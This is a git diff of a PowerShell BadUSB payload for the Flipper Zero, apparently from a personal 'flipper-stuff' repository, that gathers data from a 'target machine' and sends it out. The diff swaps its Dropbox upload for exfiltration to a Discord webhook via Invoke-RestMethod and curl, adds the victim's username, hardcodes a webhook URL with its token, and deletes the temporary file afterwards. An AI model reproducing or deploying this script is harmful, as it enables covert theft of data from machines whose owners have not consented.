@@ -10,11 +10,12 @@
     Dropbox if you provide a valid API key.
 
 .NOTES
-    Version:    1.0
+    Version:    0.2
 
     Author:     Contrxl
 
     Updated:    05/06/2024      -First version of standalone script.
+                06/06/2024      -Changed exfil method to Discord over DropBox.
 
 .LINK 
     https://github.com/contrxl/flipper-stuff/tree/main/badusb
@@ -22,7 +23,7 @@
 .EXAMPLE
     To run this as intended with FlipperZero:
         - Take a copy of "Snoop.txt"
-        - Insert your DropBox API key in the $db variable.
+        - Insert your Discord Webhook URL in the $dc variable.
         - Upload "Snoop.txt" to your FlipperZero in the SDCard/badusb/ folder.
         - Connect FlipperZero to target machine and run "Snoop.txt" from badusb.
 #>
@@ -58,33 +59,40 @@ $backupcontents = Get-backupContents
 $out = ConvertTo-Json $backupcontents
 $out > $FileName 
 
-function exfilData {
-    <#
-    .SYNOPSIS
-    This function uploads the collected data to your DropBox when an API key is provided as $db.
-
-    .NOTES
-    To do:
-        - Add clean up here to remove the temp file created after it is uploaded.
-    #>
+<#
+.SYNOPSIS
+This function uploads the collected data to your Discord channel when an API key is provided as $dc.
+.NOTES
+To do:
+    - Add clean up here to remove the temp file created after it is uploaded.
+#>
+function exfilDiscord {
     [CmdletBinding()]
-    param (
-    [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-    [Alias("f")]
-    [string]$SourceFilePath
+    param(
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text
     )
-    $outputFile = Split-Path $SourceFilePath -leaf
-    $TargetFilePath="/$outputFile"
-    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $db
-    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-    $headers.Add("Authorization", $authorization)
-    $headers.Add("Dropbox-API-Arg", $arg)
-    $headers.Add("Content-Type", 'application/octet-stream')
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+    $webHook = "https://discordapp.com/api/webhooks/1248365194313465870/CkLP8xuVh2r9ZNoYeM2TnuJJ00iPGtvOeeZx3n0P4SMOeTX2DnF9Sx_Bq1bip2vngf2A"
+
+    $body = @{
+        'username' = $ENV:USERNAME
+        'content' = $text
     }
 
-# Checks that the $db value is not empty, if the value is present, runs the script.
-if (-not ([string]::IsNullOrEmpty($db))){
-    exfilData -f $FileName
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHook -Method Post -Body ($body | ConvertTo-Json)};
+
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $webHook
+    }
 }
+
+# Checks the $dc value is not empty, and if so, sends the file to Discord.
+if (-not ([string]::IsNullOrEmpty($dc))){
+    exfilDiscord -file $FileName
+}
+
+Remove-Item $FileName
